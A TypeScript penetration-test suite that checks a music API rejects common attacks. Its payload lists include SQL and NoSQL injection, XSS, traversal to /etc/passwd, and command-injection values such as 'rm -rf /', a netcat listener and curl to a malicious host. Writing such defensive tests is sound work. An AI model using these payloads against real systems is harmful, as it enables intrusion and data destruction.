/**
 * Basic Penetration Testing Suite
 * Simulates common attack vectors to verify security measures
 */

import request from 'supertest';
import { SpotifyApiServer } from '../../src/server';
import { Express } from 'express';

describe('Basic Penetration Tests', () => {
  let app: Express;
  let server: SpotifyApiServer;

  beforeAll(async () => {
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'test-secret-key-for-penetration-testing';
    
    server = new SpotifyApiServer();
    app = server.getApp();
  });

  afterAll(async () => {
    if (server) {
      await server.getServer()?.close();
    }
  });

  describe('Authentication Bypass Attempts', () => {
    const protectedEndpoints = [
      '/api/users/profile',
      '/api/songs/upload',
      '/api/albums/create',
      '/api/users/settings'
    ];

    it('should prevent access without authentication', async () => {
      for (const endpoint of protectedEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(401);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent access with malformed tokens', async () => {
      const malformedTokens = [
        'Bearer',
        'Bearer ',
        'Bearer invalid',
        'Bearer null',
        'Bearer undefined',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid'
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/users/profile')
          .set('Authorization', token)
          .expect(401);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent JWT algorithm confusion attacks', async () => {
      // Try to use 'none' algorithm
      const noneAlgToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.';
      
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${noneAlgToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error');
    });

    it('should prevent token reuse after logout', async () => {
      // This test assumes we have a valid token mechanism
      // In a real scenario, you'd first login to get a token
      const mockToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJpYXQiOjE2MzQ1NjcwMDB9.test';
      
      // Try to use token after it should be invalidated
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${mockToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error');
    });
  });

  describe('SQL Injection Attempts', () => {
    const sqlInjectionPayloads = [
      \"' OR '1'='1\",
      \"'; DROP TABLE users; --\",
      \"' UNION SELECT * FROM users --\",
      \"admin'--\",
      \"admin'/*\",
      \"' OR 1=1#\",
      \"' OR 'x'='x\",
      \"'; EXEC xp_cmdshell('dir'); --\",
      \"1' AND (SELECT COUNT(*) FROM users) > 0 --\"
    ];

    it('should prevent SQL injection in login', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: 'password'
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).not.toContain('SQL');
        expect(response.body.error).not.toContain('database');
      }
    });

    it('should prevent SQL injection in search', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/api/songs/search?q=${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent SQL injection in user ID parameters', async () => {
      const numericInjections = [
        '1 OR 1=1',
        '1; DROP TABLE users;',
        '1 UNION SELECT * FROM users',
        '1\' OR \'1\'=\'1'
      ];

      for (const payload of numericInjections) {
        const response = await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('NoSQL Injection Attempts', () => {
    it('should prevent NoSQL injection in authentication', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password' },
        { $or: [{ email: 'admin' }, { email: 'user' }] }
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: payload
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent NoSQL injection in queries', async () => {
      const response = await request(app)
        .post('/api/songs/search')
        .send({
          query: { $where: 'this.title' }
        })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });
  });

  describe('XSS (Cross-Site Scripting) Attempts', () => {
    const xssPayloads = [
      '<script>alert(\"XSS\")</script>',
      '<img src=x onerror=alert(\"XSS\")>',
      'javascript:alert(\"XSS\")',
      '<svg onload=alert(\"XSS\")>',
      '\"><script>alert(\"XSS\")</script>',
      \"'><script>alert('XSS')</script>\",
      '<iframe src=\"javascript:alert(\\\"XSS\\\")\"></iframe>',
      '<body onload=alert(\"XSS\")>',
      '<div onclick=alert(\"XSS\")>Click me</div>'
    ];

    it('should prevent stored XSS in user profiles', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: 'test@example.com',
            password: 'ValidPassword123!',
            name: payload
          })
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent reflected XSS in search results', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .get(`/api/songs/search?q=${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should sanitize user input in responses', async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'test@example.com',
          password: 'ValidPassword123!',
          name: '<script>alert(\"test\")</script>Test User'
        });

      if (response.status === 201 && response.body.user) {
        expect(response.body.user.name).not.toContain('<script>');
        expect(response.body.user.name).not.toContain('alert');
      }
    });
  });

  describe('CSRF (Cross-Site Request Forgery) Attempts', () => {
    it('should require CSRF token for state-changing operations', async () => {
      const response = await request(app)
        .post('/api/users/profile')
        .send({
          name: 'Updated Name'
        })
        .expect(401); // Should fail due to missing authentication

      expect(response.body).toHaveProperty('error');
    });

    it('should validate origin header for sensitive operations', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Origin', 'https://malicious-site.com')
        .send({
          email: 'test@example.com',
          password: 'password'
        })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });
  });

  describe('Directory Traversal Attempts', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
      '....//....//....//etc//passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];

    it('should prevent directory traversal in file uploads', async () => {
      for (const payload of traversalPayloads) {
        const response = await request(app)
          .post('/api/songs/upload')
          .attach('file', Buffer.from('test'), payload)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent directory traversal in file downloads', async () => {
      for (const payload of traversalPayloads) {
        const response = await request(app)
          .get(`/api/songs/download/${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('Command Injection Attempts', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(id)',
      '; ping -c 1 127.0.0.1',
      '| nc -l 4444',
      '; curl http://malicious-site.com'
    ];

    it('should prevent command injection in file processing', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/songs/upload')
          .attach('file', Buffer.from('test'), `test${payload}.mp3`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should prevent command injection in search queries', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .get(`/api/songs/search?q=${encodeURIComponent(payload)}`)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });
  });

  describe('HTTP Header Injection Attempts', () => {
    it('should prevent header injection in responses', async () => {
      const maliciousHeaders = [
        'test\\r\\nSet-Cookie: admin=true',
        'test\\r\\nLocation: http://malicious-site.com',
        'test\\n\\rContent-Type: text/html',
        'test%0d%0aSet-Cookie: admin=true'
      ];

      for (const header of maliciousHeaders) {
        const response = await request(app)
          .get('/api/songs/search')
          .set('User-Agent', header)
          .expect(400);

        expect(response.body).toHaveProperty('error');
      }
    });

    it('should validate custom headers', async () => {
      const response = await request(app)
        .get('/health')
        .set('X-Custom-Header', 'test\\r\\nMalicious: header')
        .expect(200);

      // Should not reflect malicious headers
      expect(response.headers['malicious']).toBeUndefined();
    });
  });

  describe('Denial of Service (DoS) Attempts', () => {
    it('should handle large payloads gracefully', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB
      
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'test@example.com',
          password: 'password',
          name: largePayload
        })
        .expect(413);

      expect(response.body).toHaveProperty('error');
    });

    it('should handle deeply nested JSON', async () => {
      let nestedObject: any = {};
      let current = nestedObject;
      
      // Create deeply nested object
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }
      
      const response = await request(app)
        .post('/api/auth/register')
        .send(nestedObject)
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    it('should handle excessive array elements', async () => {
      const largeArray = new Array(100000).fill('test');
      
      const response = await request(app)
        .post('/api/songs/batch-upload')
        .send({
          songs: largeArray
        })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    it('should implement rate limiting', async () => {
      const requests = Array(25).fill(null).map(() =>
        request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'wrongpassword'
          })
      );

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Information Disclosure Attempts', () => {
    it('should not expose server information', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).not.toContain('Express');
      expect(response.headers['server']).not.toContain('Node.js');
    });

    it('should not expose stack traces in production', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';
      
      const response = await request(app)
        .get('/api/nonexistent-endpoint')
        .expect(404);

      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('trace');
      
      process.env.NODE_ENV = originalEnv;
    });

    it('should not expose internal paths', async () => {
      const response = await request(app)
        .get('/api/nonexistent-endpoint')
        .expect(404);

      expect(response.body.error).not.toContain('/src/');
      expect(response.body.error).not.toContain('/node_modules/');
      expect(response.body.error).not.toContain('C:\\\\');
    });

    it('should not expose database errors', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'test@example.com',
          password: 'wrongpassword'
        })
        .expect(401);

      expect(response.body.error).not.toContain('database');
      expect(response.body.error).not.toContain('connection');
      expect(response.body.error).not.toContain('query');
      expect(response.body.error).not.toContain('table');
    });
  });

  describe('Business Logic Bypass Attempts', () => {
    it('should prevent negative quantities', async () => {
      const response = await request(app)
        .post('/api/songs/purchase')
        .send({
          songId: 'test-song-123',
          quantity: -1
        })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    it('should prevent price manipulation', async () => {
      const response = await request(app)
        .post('/api/songs/purchase')
        .send({
          songId: 'test-song-123',
          price: 0.01 // Trying to set a very low price
        })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    it('should validate user permissions for actions', async () => {
      const response = await request(app)
        .delete('/api/songs/123')
        .expect(401); // Should require authentication

      expect(response.body).toHaveProperty('error');
    });
  });
});